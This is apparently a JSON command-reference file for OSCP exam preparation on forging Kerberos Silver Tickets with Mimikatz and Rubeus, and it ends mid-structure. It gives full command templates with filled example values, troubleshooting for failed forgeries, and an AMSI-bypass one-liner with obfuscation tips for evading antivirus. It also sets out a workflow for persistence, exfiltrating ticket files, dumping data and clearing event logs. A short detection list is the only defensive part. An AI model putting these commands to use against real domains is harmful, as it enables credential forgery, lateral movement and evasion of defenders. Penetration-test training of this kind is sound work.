{
  "metadata": {
    "file_purpose": "Active Directory Silver Ticket Attack Commands - Kerberos Service Ticket Forgery",
    "oscp_relevance": "High-priority lateral movement and persistence technique using service account password hashes",
    "attack_summary": "Silver tickets are forged Kerberos TGS (service tickets) created using a service account's password hash. Unlike Golden tickets (domain-wide TGT), Silver tickets are service-specific and harder to detect.",
    "prerequisites": [
      "Service account NTLM hash (via Kerberoasting, LSASS dump, or DCSync)",
      "Domain SID",
      "Target SPN identification"
    ],
    "related_techniques": [
      "Kerberoasting",
      "Pass-the-Ticket",
      "Golden Ticket",
      "Overpass-the-Hash"
    ],
    "created_date": "2025-11-10",
    "last_updated": "2025-11-10"
  },
  "commands": [
    {
      "id": "ad-silver-ticket-mimikatz-create",
      "name": "Create Silver Ticket with Mimikatz",
      "category": "active-directory",
      "subcategory": "kerberos-attacks",
      "command": "mimikatz # kerberos::golden /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /target:<TARGET_SERVER_FQDN> /service:<SPN_SERVICE> /rc4:<SERVICE_ACCOUNT_NTLM> /user:<IMPERSONATED_USER> /ptt",
      "description": "Forge a Kerberos service ticket (TGS) for a specific SPN using the service account's NTLM hash. The forged ticket grants access to that service with arbitrary user identity and permissions.",
      "tags": [
        "ACTIVE_DIRECTORY",
        "KERBEROS_ATTACKS",
        "SILVER_TICKET",
        "OSCP:HIGH",
        "LATERAL_MOVEMENT",
        "PERSISTENCE",
        "MIMIKATZ",
        "PRIVILEGE_ESCALATION"
      ],
      "variables": [
        {
          "name": "DOMAIN_FQDN",
          "description": "Fully Qualified Domain Name of the Active Directory domain",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "DOMAIN_SID",
          "description": "Domain Security Identifier (without user RID). Extract with 'whoami /user' and remove last segment after final hyphen.",
          "example": "S-1-5-21-1987370270-658905905-1781884369",
          "required": true
        },
        {
          "name": "TARGET_SERVER_FQDN",
          "description": "Fully Qualified Domain Name of the server hosting the target SPN. Must match SPN registration exactly (case-insensitive but FQDN required).",
          "example": "web04.corp.com",
          "required": true
        },
        {
          "name": "SPN_SERVICE",
          "description": "Service Principal Name type. Common types: cifs (file shares), http (IIS/web), mssql (SQL Server), ldap (directory services), host (multiple services), rpcss (RPC), wsman (PowerShell remoting).",
          "example": "http",
          "required": true
        },
        {
          "name": "SERVICE_ACCOUNT_NTLM",
          "description": "NTLM hash of the service account that runs the target SPN. Obtain via Kerberoasting (crack TGS), LSASS dump (if service account logged on), or DCSync.",
          "example": "4d28cf5252d39971419580a51484ca09",
          "required": true
        },
        {
          "name": "IMPERSONATED_USER",
          "description": "Username to impersonate in the forged ticket. Can be ANY domain user (existing or fictional). Mimikatz sets group memberships to Domain Admins by default.",
          "example": "jeffadmin",
          "required": true
        }
      ],
      "flag_explanations": {
        "/domain": "Target domain's Fully Qualified Domain Name (e.g., corp.com). CRITICAL: Use FQDN, not NetBIOS name. The forged ticket's domain field must match the target service's domain configuration. If mismatch, authentication fails with KRB_AP_ERR_NOT_US. This parameter sets the ticket's 'realm' field in Kerberos protocol. Time to obtain: <5 seconds (run 'echo %userdnsdomain%' or Get-NetDomain).",
        "/sid": "Domain Security Identifier WITHOUT the RID (Relative Identifier). Format: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX. Extract from 'whoami /user' output by removing the last segment after the final hyphen (that's the user RID, not part of Domain SID). WHY CRITICAL: Mimikatz uses this to construct the PAC (Privilege Attribute Certificate) in the forged ticket. Incorrect SID causes authentication failure with KRB_AP_ERR_MODIFIED. Common mistake: Including the user RID (e.g., -1105) - DON'T. Alternative extraction: Get-DomainSID (PowerView).",
        "/target": "Fully Qualified Domain Name of the server where the SPN is registered (e.g., web04.corp.com). MUST match the SPN registration in Active Directory exactly. Verify with 'setspn -L <service_account>' or 'setspn -Q */<hostname>*'. Mismatch between /target and actual SPN registration causes 'Server not found in Kerberos database' error. Use FQDN even if NetBIOS name works for other tools. WHY: Kerberos is FQDN-based. The ticket's 'sname' field must match the service's registered name.",
        "/service": "SPN service type (protocol identifier in SPN format: service/hostname). Common OSCP-relevant types:\n- cifs: File shares (\\\\server\\share), SMB access, remote admin (C$, ADMIN$). Most common for lateral movement.\n- http: IIS web servers, web applications, REST APIs. Use for web-based exploitation.\n- mssql: Microsoft SQL Server instances (port 1433 default). Use for database access, xp_cmdshell execution.\n- ldap: Active Directory domain controllers, directory queries. Use for DC impersonation (rare for Silver, common for Golden).\n- host: Generic host services (multiple services under one SPN). Use when specific service type unknown.\n- rpcss: Remote Procedure Call services, DCOM. Advanced lateral movement.\n- wsman: Windows Remote Management (WinRM), PowerShell remoting (port 5985/5986).\n\nWHY IT MATTERS: The service field determines which application validates the ticket. Wrong service type = access denied even with valid ticket. Example: Using 'http' ticket to access SMB share (cifs) fails. Time to identify: 30 seconds with 'setspn -Q */<hostname>*'.",
        "/rc4": "NTLM hash (NT hash, not LM hash) of the service account that runs the target SPN. This is the ENCRYPTION KEY for the service ticket. Mimikatz uses this hash to encrypt the forged PAC and ticket data. The target service decrypts the ticket using the same hash stored in its memory. WHY THIS WORKS: Service accounts decrypt tickets using their own password hash - they don't contact the KDC to validate the ticket's authenticity (unless PAC validation is enabled, which is rare). Sources:\n1. Kerberoasting: Obtain TGS-REP for SPN, crack offline with Hashcat (mode 13100) to get plaintext password, then convert to NTLM (use Rubeus /enctype:rc4 or manually hash with MD4).\n2. LSASS dump: If service account has active session on compromised machine, use Mimikatz 'sekurlsa::logonpasswords' to extract NTLM directly.\n3. DCSync: If you have Domain Admin rights, use 'lsadump::dcsync /user:service_account' to retrieve NTLM without cracking.\n\nFormat: 32 hexadecimal characters (128-bit MD4 hash). Example: 4d28cf5252d39971419580a51484ca09. Case-insensitive. Alternative flags: /aes256 (AES256 key, stealthier but requires key extraction), /aes128 (AES128 key).",
        "/user": "Username of the identity you want to impersonate in the forged ticket. THIS CAN BE FICTIONAL - the service application typically does NOT verify the user exists in AD (unless PAC validation enabled, rare). Mimikatz defaults to setting this user as:\n- Domain Administrator (RID 500)\n- Member of Domain Admins (SID S-1-5-21-DOMAIN-DOMAIN-DOMAIN-512)\n- Member of Enterprise Admins, Schema Admins, Administrators\n\nThis gives the forged ticket FULL administrative permissions on the target service. You can use ANY username - common choices:\n1. Real domain admin account (e.g., 'Administrator') - blends with legitimate traffic\n2. Current compromised user (e.g., 'jeff') - maintains appearance of normal activity\n3. Fictional high-privilege account (e.g., 'svcadmin') - works if PAC validation disabled\n\nWHY IT MATTERS: The /user value appears in service logs (Event ID 4624, 4768, 4769), so choose wisely for OPSEC. The actual permissions granted are determined by group memberships in the PAC (which Mimikatz sets to Domain Admins), not the username itself.",
        "/ptt": "Pass-the-Ticket - Automatically inject the forged ticket into the current logon session's Kerberos ticket cache (same as 'kerberos::ptt'). After injection, any application in the current session can use the ticket transparently (e.g., 'dir \\\\server\\share', 'Invoke-WebRequest http://server'). Alternative: Omit /ptt and manually inject later with 'kerberos::ptt <ticket_file.kirbi>'. WHY USE /ptt: Immediate usage, no intermediate file storage (stealthier), fewer steps. WHY SKIP /ptt: Save ticket to disk for later use, transfer to different machine, or inject into different user session. Without /ptt, Mimikatz saves ticket as '<user>@<service>-<domain>.kirbi' in current directory."
      },
      "success_indicators": [
        "Output: 'Golden ticket for '<user> @ <domain>' successfully submitted for current session' (confusingly calls Silver tickets 'Golden' - ignore this)",
        "Ticket visible in: klist (shows Server: <service>/<target_server> @ <domain>)",
        "Ticket Encryption Type: RSADSI RC4-HMAC(NT) (if using /rc4)",
        "Ticket Flags: 0x40a00000 -> forwardable renewable pre_authent (normal flags)",
        "End Time: 10 years in the future (default Mimikatz validity period)",
        "Successful service access: 'dir \\\\<target_server>\\C$' (for cifs), 'iwr http://<target_server>' (for http)",
        "No authentication prompts when accessing the service"
      ],
      "failure_indicators": [
        "ERROR: KRB_AP_ERR_MODIFIED - Incorrect Domain SID (common mistake: included user RID), or wrong NTLM hash",
        "ERROR: KRB_AP_ERR_NOT_US - Domain name mismatch (/domain doesn't match service's registered domain)",
        "ERROR: Server not found in Kerberos database - /target hostname doesn't match SPN registration (use FQDN)",
        "Access denied after ticket injection - Wrong /service type for target resource (e.g., used 'http' for SMB share)",
        "Ticket not visible in klist - /ptt may have failed, check Mimikatz privilege::debug status",
        "KDC_ERR_S_PRINCIPAL_UNKNOWN - Service account doesn't have SPN registered (verify with setspn -L)",
        "PAC validation error (rare) - Target service has PAC validation enabled, verifies ticket with DC"
      ],
      "troubleshooting": {
        "Forged ticket visible in klist but access still denied": "DIAGNOSIS: Wrong service type. The /service parameter must match the resource you're accessing. SOLUTION: Verify SPN with 'setspn -Q */<hostname>*'. Common fix: Change /service from 'http' to 'cifs' for file shares, or 'cifs' to 'http' for web apps. VALIDATION: List all SPNs on target with 'setspn -L <target_server>' (if you have access) or enumerate from DC with PowerView: Get-NetUser -SPN | Where {$_.serviceprincipalname -match '<hostname>'}.",
        "KRB_AP_ERR_MODIFIED error when using ticket": "DIAGNOSIS: Ticket decryption failed on service side. Two main causes:\n1. Wrong NTLM hash - Service encrypted its ticket copy with a different password hash than you used to forge the ticket. SOLUTION: Re-obtain service account hash. Verify it's current (password may have changed). Test hash validity with CME: crackmapexec smb <dc_ip> -u <service_account> -H <ntlm_hash>.\n2. Wrong Domain SID - Included user RID by mistake. SOLUTION: Re-extract Domain SID with 'whoami /user', remove ONLY the last segment (RID). Example: S-1-5-21-123-456-789-1105 → Domain SID is S-1-5-21-123-456-789 (remove -1105).\n\nVALIDATION: Run Mimikatz in debug mode to see detailed error. Check Event ID 4769 on service machine for failure reason.",
        "Hostname mismatch / SPN not found errors": "DIAGNOSIS: /target value doesn't match how the SPN is registered in AD. SOLUTION:\n1. Get exact SPN registration: setspn -Q */<hostname_or_partial>* from any domain-joined machine\n2. Extract hostname: SPN format is 'service/hostname.domain.com:port'. Use the full hostname portion.\n3. Verify FQDN: ping <hostname> to see if it resolves to FQDN. Use the FQDN in /target.\n4. Check SPN case: Kerberos is case-insensitive but use exact case from setspn output to avoid issues.\n\nEXAMPLE: If setspn shows 'HTTP/web04.corp.com', use /target:web04.corp.com /service:http (NOT http://web04 or WEB04).",
        "Need to use ticket on different machine": "SOLUTION: Don't use /ptt flag. Mimikatz will save ticket to .kirbi file (e.g., jeffadmin@http-web04.corp.com.kirbi). Transfer this file to target machine via SMB, HTTP, or base64 encoding. On target machine: Mimikatz > kerberos::ptt jeffadmin@http-web04.corp.com.kirbi. ALTERNATIVE: Use Rubeus for ticket conversion: Rubeus.exe dump /service:<service> /nowrap (exports base64), then Rubeus.exe ptt /ticket:<base64> on target machine.",
        "PAC validation enabled on target service (rare but fatal)": "DIAGNOSIS: Service is configured to validate the PAC with the DC (DC verifies user exists and group memberships are legitimate). Modern patch KB5020805 (Oct 2022) enforces PAC validation. SYMPTOMS: Event ID 4769 on DC shows PAC validation request, followed by access denied. SOLUTION: Silver tickets won't work if PAC validation enabled. ALTERNATIVES:\n1. Use legitimate credentials (password or hash) with Pass-the-Hash or Overpass-the-Hash\n2. Compromise the DC and disable PAC validation (high-risk)\n3. Use Golden Ticket instead (DC-signed, passes PAC validation)\n4. Target different service without PAC validation enabled\n\nDETECTION: Query service config: reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\<ServiceName>\\Parameters /v ValidateKdcPacSignature (value 1 = enabled).",
        "Service account password changed after hash obtained": "DIAGNOSIS: NTLM hash is stale. Kerberos tickets encrypted with old hash won't decrypt on service side. SYMPTOMS: KRB_AP_ERR_MODIFIED error. SOLUTION: Re-obtain current NTLM hash:\n1. Re-run Kerberoasting: impacket-GetUserSPNs with -request, crack new TGS-REP\n2. Re-dump LSASS if service account has active session\n3. Re-run DCSync if you have DA rights\n\nPREVENTION: Check password last set date before forging ticket: Get-NetUser -Identity <service_account> -Properties passwordlastset. If recent, hash may change soon. OSCP EXAM NOTE: Service account passwords typically don't change during exam, but in real engagements this is common (especially if detection alerts password compromise)."
      },
      "notes": "OSCP METHODOLOGY - WHEN TO USE SILVER TICKETS:\nSilver tickets are LATERAL MOVEMENT and PERSISTENCE techniques that work when you have:\n1.\n\nService account NTLM hash (from Kerberoasting, LSASS dump, or DCSync)\n2.\n\nCannot use the hash directly with Pass-the-Hash (service doesn't support NTLM auth, only Kerberos)\n3.\n\nNeed access to specific service without full domain compromise\n4.\n\nWant stealthier persistence than Golden Ticket (service-level, not domain-level)\n\nSILVER VS OTHER TECHNIQUES:\nSILVER TICKET vs PASS-THE-HASH:\n- Use PTH:\nWhen service supports NTLM authentication (SMB, WMI, WinRM with CredSSP)\n- Use Silver:\nWhen service only accepts Kerberos (IIS with Kerberos-only, SQL Server with integrated auth, modern hardened services)\n- Advantage of Silver:\nWorks against Kerberos-only services, persists in ticket cache for 10 years (default)\n- Advantage of PTH:\nSimpler (just use hash directly), no ticket forging needed\n\nSILVER TICKET vs GOLDEN TICKET:\n- Use Golden:\nWhen you have krbtgt hash (full domain compromise), need domain-wide access, want to impersonate any user to any service\n- Use Silver:\nWhen you only have service account hash (partial compromise), need access to ONE specific service, want lower detection risk\n- Advantage of Silver:\nStealthier (no DC interaction, service-level only), faster to create (no krbtgt needed)\n- Advantage of Golden:\nDomain-wide access, works for all services, bypasses most Kerberos security checks\n- Detection difference:\nGolden tickets generate Event ID 4768 (TGT request) anomalies on DC, Silver tickets only generate Event ID 4769 (TGS usage) on service machine\n\nSILVER TICKET vs KERBEROASTING (continued attack chain):\n- Kerberoasting:\nObtain TGS-REP encrypted with service account hash\n- Crack TGS-REP:\nGet plaintext password or NTLM hash\n- Silver Ticket:\nUse obtained hash to forge tickets for that service\n- This is the TYPICAL OSCP EXAM FLOW:\nKerberoast → Crack → Silver Ticket → Service Access\n\nMANUAL ALTERNATIVES (if Mimikatz unavailable):\nRubeus (recommended alternative):\nRubeus.exe silver /domain:<domain> /sid:<domain_sid> /target:<target> /service:<service> /rc4:<ntlm_hash> /user:<user> /ptt\n- Advantages:\nActively maintained, better OPSEC, cleaner output, supports AES encryption\n- Same functionality as Mimikatz kerberos::golden but modern codebase\n\nimpacket-ticketer (Linux-based):\npython3 ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain> -spn <service>/<target> <username>\n- Generates .ccache file (Kerberos credential cache)\n- Use with:\nexport KRB5CCNAME=<username>.ccache, then access service with impacket tools\n- LIMITATION:\nCan't directly inject into Windows session, must use .ccache with Linux Kerberos tools\n\nCOMMON SPN SERVICE TYPES FOR OSCP:\n1.\n\ncifs (File Shares, SMB):\nMost common lateral movement target\n   - Access:\ndir \\\\<server>\\C$, copy files, PsExec, remote admin\n   - Obtain hash:\nKerberoast user accounts with SPN cifs/<hostname>, or dump LSASS on fileserver\n   - OSCP scenario:\nPivot to fileserver, exfiltrate data, plant backdoors\n\n2.\n\nhttp (IIS, Web Apps):\nCommon for web-based exploitation\n   - Access:\nInvoke-WebRequest http://<server>, upload webshell, access admin panels\n   - Obtain hash:\nKerberoast IIS service accounts (often named iis_service, websvc, apppooluser)\n   - OSCP scenario:\nAccess restricted web admin interface, upload reverse shell, exploit web vulns\n\n3.\n\nmssql (SQL Server):\nDatabase access and code execution\n   - Access:\nInvoke-Sqlcmd, xp_cmdshell for RCE, database enumeration\n   - Obtain hash:\nKerberoast SQL service accounts (often high-privilege)\n   - OSCP scenario:\nEnable xp_cmdshell, execute OS commands, escalate to SYSTEM via SQL Agent\n\n4.\n\nldap (Domain Controllers):\nAdvanced AD attacks\n   - Access:\nLDAP queries, directory modifications, DCSync (if permissions exist)\n   - Obtain hash:\nCompromise DC, dump LSASS, DCSync domain controller computer account\n   - OSCP scenario:\nRare for Silver (use Golden instead), but useful for specific LDAP-based exploits\n\n5.\n\nhost (Generic Host Services):\nCatch-all for multiple services\n   - Access:\nMultiple protocols (RPC, WMI, scheduled tasks, services)\n   - Obtain hash:\nKerberoast computer accounts (machine accounts often have host SPN)\n   - OSCP scenario:\nRemote service creation, scheduled task execution, WMI code execution\n\nTIME ESTIMATES FOR OSCP EXAM:\n- Prerequisite gathering (Domain SID, SPN enumeration):\n2-3 minutes\n- Service account hash acquisition:\n  - Via Kerberoasting (if not done):\n5-10 minutes (request TGS, crack with Hashcat)\n  - Via LSASS dump (if service account logged on):\n2 minutes (Mimikatz sekurlsa::logonpasswords)\n  - Via DCSync (if DA already):\n1 minute (lsadump::dcsync)\n- Silver ticket creation:\n<1 minute (Mimikatz command)\n- Validation and service access:\n1-2 minutes (klist, test access)\n- TOTAL:\n10-20 minutes end-to-end (assumes hash not yet obtained)\n\nIf hash already obtained (e.g., from earlier Kerberoasting):\n5 minutes total\n\nDETECTION AND OPSEC:\nEVENT IDS GENERATED:\n- Mimikatz execution:\nEvent ID 4688 (Process Creation), AMSI alerts if not obfuscated\n- Ticket injection:\nEvent ID 4768 (TGT Request) - NOT generated (Silver tickets skip TGT step)\n- Service access:\nEvent ID 4769 (TGS Request) - Generated on SERVICE machine, not DC\n- Logon event:\nEvent ID 4624 (Logon Type 3 - Network) on target service machine\n\nDETECTION INDICATORS (Blue Team Perspective):\n- Service ticket (TGS) with 10-year lifetime (legitimate tickets expire in hours)\n- Service ticket not issued by DC (no corresponding Event ID 4769 on DC)\n- Encryption downgrade (RC4 instead of AES256) - modern environments prefer AES\n- Account logon from unusual source IP\n- Account accessing service it never accessed before (behavioral anomaly)\n\nOPSEC IMPROVEMENTS:\n1.\n\nUse /aes256 instead of /rc4 (requires AES key, not NTLM hash):\nMimikatz /aes256:<hex_key>\n2.\n\nSet realistic ticket lifetime:\n/endin:8 (expires in 8 hours) /renewmax:24 (renewable for 24 hours)\n3.\n\nImpersonate real user (/user:<real_username>) instead of fictional admin\n4.\n\nUse Rubeus instead of Mimikatz (better evasion, active development)\n5.\n\nClear ticket cache after use:\nklist purge\n\nREALITY CHECK FOR OSCP EXAM:\n✅ LIKELY SCENARIOS:\n- Kerberoast service account → Crack hash → Silver ticket for lateral movement\n- Dump LSASS on compromised machine → Find service account hash → Silver ticket to pivot\n- Obtain domain admin → DCSync service accounts → Silver tickets for persistence\n\n❌ UNLIKELY SCENARIOS:\n- PAC validation enabled (rare in OSCP lab, common in modern enterprise)\n- Service account password rotation mid-exam (exam environments are static)\n- AES-only Kerberos (OSCP still allows RC4 for compatibility)\n\nCOMMON MISTAKES TO AVOID:\n1.\n\nIncluding user RID in Domain SID → Extract Domain SID correctly (remove last segment from whoami /user)\n2.\n\nUsing NetBIOS name instead of FQDN → Always use FQDN for /domain and /target\n3.\n\nWrong service type → Verify SPN with setspn -Q before forging ticket\n4.\n\nUsing NTLM hash of WRONG account → Hash must be from service account that runs the SPN, not random domain user\n5.\n\nAssuming ticket works domain-wide → Silver tickets are SERVICE-SPECIFIC (cifs ticket won't work for http)\n\nNEXT STEPS AFTER SILVER TICKET:\n1.\n\nAccess the service:\ndir \\\\<target>\\C$ (cifs), iwr http://<target> (http), Invoke-Sqlcmd (mssql)\n2.\n\nEstablish persistence:\nUpload webshell, create scheduled task, add registry run key\n3.\n\nPivot deeper:\nUse service access to compromise additional accounts, escalate privileges\n4.\n\nExfiltrate data:\nCopy sensitive files, dump databases, enumerate shares\n5.\n\nCover tracks:\nklist purge (remove ticket from cache), clear event logs (if OPSEC matters)\n\nPERSISTENCE USE CASE:\nSilver tickets excel at PERSISTENCE because:\n- Valid for 10 years (default) - Long-term access\n- No password change detection - Even if service account password changes, cached ticket still works until service restarts (Windows doesn't re-validate cached tickets)\n- No DC communication - Ticket works offline, survives DC reboots\n- Service-level only - Harder to detect than domain-wide Golden ticket\n\nPERSISTENCE WORKFLOW:\n1.\n\nObtain service account hash during initial compromise\n2.\n\nForge Silver ticket, save to .kirbi file (omit /ptt)\n3.\n\nExfiltrate .kirbi file off target network\n4.\n\nReturn weeks/months later, inject ticket:\nkerberos::ptt <ticket.kirbi>\n5.\n\nAccess service transparently\n\nLIMITATION:\nTicket becomes invalid if:\n- Service account is deleted (rare)\n- Service account password changes AND service process restarts (clears cached encryption keys)\n- Kerberos policy enforces ticket lifetime limits (Group Policy override, uncommon)\n\nFINAL OSCP EXAM TIPS:\n1.\n\nPractice ticket creation 10+ times before exam (muscle memory for syntax)\n2.\n\nKeep Domain SID in notes (you'll use it multiple times)\n3.\n\nEnumerate all SPNs early (setspn -T <domain> -Q */*), prioritize high-value services (SQL, IIS, file shares)\n4.\n\nCrack Kerberoast hashes DURING enumeration phase (run Hashcat in background while doing other tasks)\n5.\n\nIf Mimikatz blocked by AV, use Rubeus (often bypasses signature-based detection)\n6.\n\nTest ticket with klist BEFORE attempting service access (saves time troubleshooting)\n7.\n\nDocument which tickets you've created (easy to lose track with multiple targets)\n\nREFERENCES AND FURTHER LEARNING:\n- Mimikatz Kerberos module:\nhttps://github.com/gentilkiwi/mimikatz/wiki/module~kerberos\n- Rubeus Silver Ticket:\nhttps://github.com/GhostPack/Rubeus#silver\n- Sean Metcalf's Silver Ticket research:\nhttps://adsecurity.org/?p=2011\n- Kerberos RFC 4120:\nhttps://www.rfc-editor.org/rfc/rfc4120 (protocol specification)\n- MITRE ATT&CK T1558.002:\nhttps://attack.mitre.org/techniques/T1558/002/ (Silver Ticket technique)\n\nThis technique is a cornerstone of OSCP Active Directory exploitation.\n\nMaster it thoroughly.",
      "oscp_relevance": "high",
      "alternatives": [
        "ad-silver-ticket-rubeus-create",
        "overpass-mimikatz-pth"
      ],
      "next_steps": [
        "kerberos-klist-verify",
        "ad-silver-ticket-validate-access"
      ],
      "prerequisites": [
        "ad-sid-whoami-extract",
        "impacket-getuserspns-kerberoast",
        "ad-enumerate-spn-target"
      ],
      "filled_example": "mimikatz # kerberos::golden /domain:<corp.com> /sid:<S-1-5-21-1987370270-658905905-1781884369> /target:<web04.corp.com> /service:<http> /rc4:<4d28cf5252d39971419580a51484ca09> /user:<jeffadmin> /ptt"
    },
    {
      "id": "ad-silver-ticket-rubeus-create",
      "name": "Create Silver Ticket with Rubeus",
      "category": "active-directory",
      "subcategory": "kerberos-attacks",
      "command": "Rubeus.exe silver /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /target:<TARGET_SERVER_FQDN> /service:<SPN_SERVICE> /rc4:<SERVICE_ACCOUNT_NTLM> /user:<IMPERSONATED_USER> /ptt",
      "description": "Forge a Kerberos service ticket (TGS) using Rubeus, a modern C# alternative to Mimikatz. Supports AES encryption and better OPSEC with cleaner output and fewer detection signatures.",
      "tags": [
        "ACTIVE_DIRECTORY",
        "KERBEROS_ATTACKS",
        "SILVER_TICKET",
        "OSCP:HIGH",
        "LATERAL_MOVEMENT",
        "RUBEUS",
        "MODERN_TOOLING"
      ],
      "variables": [
        {
          "name": "DOMAIN_FQDN",
          "description": "Fully Qualified Domain Name of the Active Directory domain",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "DOMAIN_SID",
          "description": "Domain Security Identifier (without user RID)",
          "example": "S-1-5-21-1987370270-658905905-1781884369",
          "required": true
        },
        {
          "name": "TARGET_SERVER_FQDN",
          "description": "Fully Qualified Domain Name of the server hosting the target SPN",
          "example": "web04.corp.com",
          "required": true
        },
        {
          "name": "SPN_SERVICE",
          "description": "Service Principal Name type (cifs, http, mssql, ldap, host, etc.)",
          "example": "http",
          "required": true
        },
        {
          "name": "SERVICE_ACCOUNT_NTLM",
          "description": "NTLM hash of the service account that runs the target SPN",
          "example": "4d28cf5252d39971419580a51484ca09",
          "required": true
        },
        {
          "name": "IMPERSONATED_USER",
          "description": "Username to impersonate in the forged ticket",
          "example": "jeffadmin",
          "required": true
        }
      ],
      "flag_explanations": {
        "/domain": "Target domain FQDN. Same as Mimikatz but Rubeus validates format more strictly (must be valid FQDN, rejects NetBIOS-only names). Rubeus also supports /dc:<dc_fqdn> to specify which DC to target for validation queries (optional, not needed for Silver tickets).",
        "/sid": "Domain SID without RID. Rubeus uses this to construct the PAC. Supports /sid:S-1-5-21-XXX OR accepts base64-encoded SID if obtained programmatically. More forgiving of formatting than Mimikatz (auto-trims whitespace).",
        "/target": "Target server FQDN where SPN is registered. Rubeus performs additional validation: warns if target doesn't resolve in DNS (helps catch typos). Use /targetuser:<account> instead if you know the service account name (Rubeus will query SPN automatically).",
        "/service": "SPN service type. Rubeus supports all standard types (cifs, http, mssql, ldap, host, rpcss, wsman) plus custom SPNs. Multiple services: /service:cifs,http creates tickets for both services simultaneously (Rubeus advantage over Mimikatz). WHY USEFUL: Some servers run multiple SPNs - create all tickets in one command.",
        "/rc4": "NTLM hash for RC4 encryption. Rubeus ALSO supports /aes256:<hex_key> and /aes128:<hex_key> for AES encryption (RECOMMENDED for OPSEC - AES is modern standard, RC4 is legacy and flagged by modern EDR). To obtain AES keys: DCSync with Mimikatz shows Kerberos keys (aes256-cts-hmac-sha1-96), or use Rubeus /enctype:aes256 during Kerberoasting.",
        "/user": "Impersonated username. Rubeus defaults to Domain Admins group membership (same as Mimikatz). RUBEUS ADVANTAGE: Use /groups:544,512,519 to manually specify group RIDs (544=Administrators, 512=Domain Admins, 519=Enterprise Admins). Custom groups allow fine-tuned permissions (e.g., /groups:512 only for minimal Domain Admin rights).",
        "/ptt": "Pass-the-Ticket - Inject forged ticket into current session. RUBEUS DIFFERENCE: Also supports /outfile:<file.kirbi> to save ticket to disk WITHOUT injecting (useful for ticket transfer). Combine both: /ptt /outfile:ticket.kirbi (inject AND save). RUBEUS ALSO SUPPORTS: /ticket:<base64> to inject pre-existing ticket from base64 string (useful for transferring tickets across machines via clipboard)."
      },
      "success_indicators": [
        "Output: '[*] Building PAC' (Rubeus shows detailed construction steps)",
        "Output: '[*] Signing PAC' (confirms PAC signature generation)",
        "Output: '[*] Encrypting ticket' (confirms encryption with provided hash/key)",
        "Output: '[+] Ticket successfully imported!' (if /ptt used)",
        "Base64 ticket blob displayed (if /outfile or no /ptt - can copy/paste for transfer)",
        "Ticket visible in: Rubeus.exe klist OR native klist command",
        "Successful service access after injection"
      ],
      "failure_indicators": [
        "ERROR: Failed to parse domain SID - Incorrect SID format (check for typos, ensure S-1-5-21 prefix)",
        "ERROR: Failed to build ticket - Missing required parameter or invalid service type",
        "WARNING: Target does not resolve - Typo in /target hostname (ticket still created but may not work)",
        "ERROR: Failed to import ticket - Insufficient privileges (run as admin or use privilege::debug)",
        "Access denied after injection - Wrong service type or hash mismatch (same as Mimikatz troubleshooting)"
      ],
      "troubleshooting": {
        "Rubeus not recognized / AMSI blocks execution": "AMSI (Antimalware Scan Interface) may block Rubeus binary or in-memory loading. SOLUTIONS:\n1. Obfuscate binary: Use ConfuserEx, .NET Reactor, or Donut to obfuscate Rubeus.exe\n2. AMSI bypass: Patch AMSI in PowerShell before loading Rubeus: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n3. Compile from source: Download Rubeus source from GitHub, modify function/class names, recompile (breaks signature detection)\n4. Use Rubeus DLL: Compile as DLL, load via Execute-Assembly in Cobalt Strike or similar C2\n5. Fallback: Use Mimikatz if Rubeus detection is insurmountable",
        "Need AES key instead of NTLM hash for better OPSEC": "OBTAINING AES KEYS:\n1. DCSync: Mimikatz lsadump::dcsync /user:<service_account> shows 'aes256-cts-hmac-sha1-96' and 'aes128-cts-hmac-sha1-96' keys\n2. Kerberoasting with AES: Rubeus.exe kerberoast /user:<service_account> /enctype:aes256 (requests AES-encrypted TGS instead of RC4)\n3. LSASS dump: Mimikatz sekurlsa::ekeys shows AES keys for logged-on accounts\n\nUSAGE: Rubeus.exe silver /aes256:<64_hex_chars> ... (replace /rc4 with /aes256)\n\nWHY BETTER: AES256 is modern Kerberos standard (MS14-068 patch encourages AES). RC4 tickets are flagged by modern EDR as legacy/suspicious. AES256 tickets blend with normal traffic.",
        "Transferring ticket to different machine": "RUBEUS METHOD (cleaner than .kirbi files):\n1. Create ticket without /ptt: Rubeus.exe silver ... /outfile:ticket.kirbi\n2. Convert .kirbi to base64: Rubeus.exe describe /ticket:ticket.kirbi /nowrap (outputs base64 string)\n3. Copy base64 string to clipboard, transfer to target machine (paste in RDP, HTTP upload, etc.)\n4. Inject on target: Rubeus.exe ptt /ticket:<base64_string>\n\nALTERNATIVE: Use /nowrap directly during creation: Rubeus.exe silver ... /nowrap (outputs base64 immediately, skip .kirbi intermediate file)\n\nADVANTAGE OVER MIMIKATZ: Base64 encoding allows clipboard transfer, bypasses file-based AV scanning, works in restricted environments where file write is blocked.",
        "Creating multiple tickets for different services on same server": "Rubeus supports BATCH TICKET CREATION:\nRubeus.exe silver /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:cifs,http,mssql /rc4:<hash> /user:admin /ptt\n\nThis creates THREE tickets (cifs, http, mssql) in ONE command, all injected simultaneously. ADVANTAGE: Access file shares (cifs), web apps (http), AND databases (mssql) with single command. Mimikatz requires three separate kerberos::golden commands.\n\nVERIFY: Rubeus.exe klist shows all three tickets in cache."
      },
